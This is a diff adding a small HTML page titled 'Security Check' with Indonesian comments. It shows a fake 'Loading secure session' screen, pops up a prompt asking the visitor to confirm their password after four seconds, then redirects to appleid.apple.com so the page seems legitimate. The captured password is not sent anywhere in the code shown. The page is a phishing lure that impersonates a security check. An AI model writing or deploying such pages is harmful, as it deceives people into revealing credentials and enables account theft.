@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Security Check</title>
+  <style>
+    body {
+      background: #111;
+      color: white;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    h2 {
+      color: #0f0;
+    }
+  </style>
+</head>
+<body>
+
+<h2>Loading secure session...</h2>
+
+<script>
+  // Delay total: 4 detik
+  setTimeout(() => {
+    const input = prompt("🔐 Identity verification required\nPlease confirm your password:");
+    
+    // Setelah prompt, lakukan redirect ke trusted domain
+    setTimeout(() => {
+      location.href = "https://appleid.apple.com"; // Trusted domain
+    }, 500); // jeda singkat setelah prompt agar tidak terasa abrupt
+
+  }, 4000);
+</script>
+
+</body>
+</html>
